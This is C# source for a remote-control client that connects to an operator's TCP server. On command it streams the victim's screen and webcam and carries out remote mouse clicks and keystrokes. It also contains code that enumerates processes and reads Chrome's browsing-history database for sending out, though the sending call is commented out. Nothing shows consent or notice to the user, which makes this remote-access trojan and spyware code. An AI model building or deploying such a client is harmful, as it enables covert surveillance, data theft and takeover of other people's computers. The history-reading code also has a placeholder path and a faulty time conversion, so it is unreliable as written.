using System;
using System.Collections.Generic;
using System.Data.SQLite;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using AForge.Video;
using AForge.Video.DirectShow;
namespace Remote_Control_Client
{
    public class ClientController
    {
        private TcpClient tcpClient;
        private NetworkStream stream;
        private BinaryReader reader;
        private BinaryWriter writer;
        private VideoCaptureDevice videoDevice;
        private FilterInfoCollection videoDevices;
        private Thread captureThread;
        private string clientHistory;
        private Thread receiveCommandsThread;
        private bool isSendingScreen = true;
        private bool isCameraActive = false;
        private string history;

    public ClientController(string serverIP, int serverPort)
    {
        tcpClient = new TcpClient(serverIP, serverPort);
        stream = tcpClient.GetStream();
        reader = new BinaryReader(stream);
        writer = new BinaryWriter(stream);
        history = "Client history...\n";
        
        receiveCommandsThread = new Thread(ReceiveCommands);
        receiveCommandsThread.Start();
    }
    public void SendScreen()
    {
        Thread screenThread = new Thread(() =>
        {
            while (true)
            {
                if (isSendingScreen && !isCameraActive) 
                {
                    Bitmap screenshot = CaptureScreen();
                    byte[] imageBytes = ConvertImageToByteArray(screenshot); 
                    writer.Write(imageBytes.Length); 
                    writer.Write(imageBytes); 
                }
                Thread.Sleep(10);
            }
        });
        screenThread.Start();
    }
    private Bitmap CaptureScreen()
    {
        Rectangle screenBounds = new Rectangle(0, 0, Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
        Bitmap screenshot = new Bitmap(screenBounds.Width, screenBounds.Height);

        using (Graphics g = Graphics.FromImage(screenshot))
        {
            g.CopyFromScreen(0, 0, 0, 0, screenBounds.Size);
        }

        return ResizeImage(screenshot, screenBounds.Width / 4, screenBounds.Height / 4);
    }
    
    private Bitmap ResizeImage(Bitmap image, int width, int height)
    {
        Bitmap resizedImage = new Bitmap(width, height);
        using (Graphics g = Graphics.FromImage(resizedImage))
        {
            g.DrawImage(image, 0, 0, width, height);
        }
        return resizedImage;
    }
    
    private byte[] ConvertImageToByteArray(Bitmap image)
    {
        using (MemoryStream ms = new MemoryStream())
        {
            image.Save(ms, ImageFormat.Jpeg);
            return ms.ToArray();
        }
    }
    
    public void StartCameraStream()
    {
        if (!isCameraActive)
        {
            isSendingScreen = false; 
            videoDevices = new FilterInfoCollection(FilterCategory.VideoInputDevice);

            if (videoDevices.Count == 0)
            {
                Console.WriteLine("No video devices found.");
                return;
            }
            videoDevice = new VideoCaptureDevice(videoDevices[0].MonikerString);
            videoDevice.NewFrame += new NewFrameEventHandler(VideoDevice_NewFrame);
            videoDevice.Start();
            isCameraActive = true;
        }
    }
    public void StopCamera()
    {
        if (videoDevice != null && videoDevice.IsRunning)
        {
            videoDevice.SignalToStop();
            videoDevice.WaitForStop();
            isCameraActive = false;
        }
        isSendingScreen = true;
    }
    private void VideoDevice_NewFrame(object sender, NewFrameEventArgs eventArgs)
    {
        try
        {
            Bitmap frame = (Bitmap)eventArgs.Frame.Clone();
            Bitmap resizedFrame = ResizeImage(frame, frame.Width / 4, frame.Height / 4);
            byte[] frameBytes = ConvertImageToByteArray(resizedFrame);
            writer.Write(frameBytes.Length);
            writer.Write(frameBytes);
        }
        catch (Exception ex)
        {
            Console.WriteLine("Error in camera frame: " + ex.Message);
        }
    }
    
    public void GetClientHistory()
    {
        writer.Write(10);
        /*foreach (var process in Process.GetProcesses())
        {
            try
            {
                DateTime startTime = process.StartTime;
                writer.Write(process.ProcessName); 
                writer.Write(startTime.ToString("o"));
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error accessing process {process.Id}: {ex.Message}");
            }
        }

        string application = GetRunningApplications();
        string browserHistory = GetBrowserHistory();
        
        writer.Write(10);
        writer.Write(application.Length);
        writer.Write(application);
        writer.Write(browserHistory.Length);
        writer.Write(browserHistory);
        writer.Write("END");*/
    }

    public void Stop()
    {
        if (captureThread != null && captureThread.IsAlive)
        {
            captureThread.Abort();
        }
        writer.Close();
        reader.Close();
        stream.Close();
        StopCamera();
        tcpClient.Close();
    }
    
    public void ReceiveCommands()
    {
        while (true)
        {
            int commandType = reader.ReadInt32(); 

            switch (commandType)
            {
                case 1: 
                    int x = reader.ReadInt32();
                    int y = reader.ReadInt32();
                    MoveMouse(x, y);
                    break;

                case 2: 
                    ClickMouse(0);
                    break;

                case 3: 
                    ClickMouse(1);
                    break;

                case 4: 
                    char key = reader.ReadChar();
                    SendKeys.Send(key.ToString());
                    break;
                case 5: 
                    SendMousePosition();
                    break;
                case 7:
                    //isSendingScreen = false;
                    StartCameraStream();
                    break;
                case 8:
                    StopCamera();
                    //isSendingScreen = true;
                    break;
                case 9: 
                    SendScreen(); 
                    //isSendingScreen = true;
                    break;
                case 10:
                    GetClientHistory();
                    break;
                    
            }
        }
    }
    
    private void MoveMouse(int x, int y)
    {
        Cursor.Position = new System.Drawing.Point(x, y);
    }
    private void ClickMouse(int button)
    {
        if (button == 0)
        {
            mouse_event(0x02, 0, 0, 0, 0);  
            mouse_event(0x04, 0, 0, 0, 0); 
        }
        else if (button == 1)
        {
            mouse_event(0x08, 0, 0, 0, 0);  
            mouse_event(0x10, 0, 0, 0, 0);  
        }
    }
    
    private void SendMousePosition()
    {
        int x = Cursor.Position.X;
        int y = Cursor.Position.Y;
        writer.Write(6); 
        writer.Write(x);
        writer.Write(y);
    }
    
    public string GetRunningApplications()
    {
        StringBuilder appHistory = new StringBuilder();

        foreach (var process in Process.GetProcesses())
        {
            try
            {
                appHistory.AppendLine($"Process: {process.ProcessName} | ID: {process.Id}");
            }
            catch (Exception ex)
            {
                appHistory.AppendLine($"Error accessing process {process.Id}: {ex.Message}");
            }
        }

        return appHistory.ToString();
    }
    public string GetBrowserHistory()
    {
        StringBuilder browserHistory = new StringBuilder();
        string chromeHistoryPath = @"C:\Users\<UserName>\AppData\Local\Google\Chrome\User Data\Default\History";

        if (File.Exists(chromeHistoryPath))
        {
            // Mở tệp lịch sử và truy vấn dữ liệu
            using (var connection = new SQLiteConnection($"Data Source={chromeHistoryPath};Version=3;"))
            {
                connection.Open();
                using (var command = new SQLiteCommand("SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC", connection))
                {
                    using (var reader = command.ExecuteReader())
                    {
                        while (reader.Read())
                        {
                            string url = reader["url"].ToString();
                            string title = reader["title"].ToString();
                            long lastVisitTime = Convert.ToInt64(reader["last_visit_time"]); // Lấy thời gian
                            DateTime visitTime = DateTime.FromFileTime(lastVisitTime * 10000 + new DateTime(1601, 1, 1).Ticks);
                        
                            browserHistory.AppendLine($"{title} - {url} - {visitTime}");
                        }
                    }
                }
            }
        }
        else
        {
            browserHistory.AppendLine("Chrome history file not found.");
        }

        return browserHistory.ToString();
    }

    
    [DllImport("user32.dll")]
    private static extern void mouse_event(int dwFlags, int dx, int dy, int dwData, int dwExtraInfo);
  
    }
    
    
}